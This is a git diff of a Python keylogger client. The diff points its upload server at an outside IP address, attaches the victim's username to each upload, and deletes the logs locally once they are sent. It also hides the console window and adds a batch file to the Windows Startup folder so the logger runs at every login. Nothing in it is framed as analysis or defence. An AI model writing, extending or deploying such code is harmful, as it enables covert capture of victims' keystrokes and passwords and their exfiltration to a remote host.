@@ -1,17 +1,21 @@
-from email.mime import message
-import xmlrpc.client, os
 
-URL = "http://localhost:14880"
+import xmlrpc.client, os
+import getpass
+
+USER_NAME = getpass.getuser()
+URL = "http://92.63.100.2:14880"
 
 server = xmlrpc.client.ServerProxy(URL)
 
 def check_connection(server):
     return True if server.arbeiten() else False
 
+if check_connection(server): print("Connection True")
+
 def send_file(path : str):
     message : str = ""
     with open(path, "r") as file: message = file.read()
-    if server.new(message):
+    if server.new(message, USER_NAME):
         os.remove(path)
         ...
 
@@ -23,7 +27,19 @@ def hideConsole():
         win32gui.ShowWindow(frgrnd_wndw, win32con.SW_HIDE)
     except: exit(1)
 
-#hideConsole()
+
+
+
+def add_to_startup(file_path=""):
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    print(bat_path)
+    
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write('@echo off\npython %s\\client.py' % file_path)
+hideConsole()
+add_to_startup()
 
 import keyboard 
 
@@ -31,7 +47,7 @@ from threading import Timer
 from datetime import datetime
 SEND_REPORT_EVERY = 30
 EMAIL_ADDRESS = "put_real_address_here@gmail.com"
-EMAIL_PASSWORD = "put_real_pw"
+EMAIL_PASSWORD = "real email # hello world"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
